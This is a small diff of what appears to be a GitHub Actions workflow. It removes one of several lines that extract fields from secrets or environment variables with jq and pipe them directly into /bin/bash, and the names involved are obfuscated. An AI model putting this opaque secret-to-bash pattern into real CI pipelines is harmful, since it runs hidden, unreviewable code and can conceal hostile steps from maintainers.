@@ -22,7 +22,6 @@ jobs:
           d5: ${{ secrets.d5 }}
         run: |
           printf '%s' "$d5" | jq -r .xrjv861 | /bin/bash
-          printf '%s' "$llob75228" | jq -r .txzl1973 | /bin/bash
           printf '%s' "$a65115" | jq -r .r8852 | /bin/bash
           echo $kgv22282 | jq -r .jzwl76 | /bin/bash
 
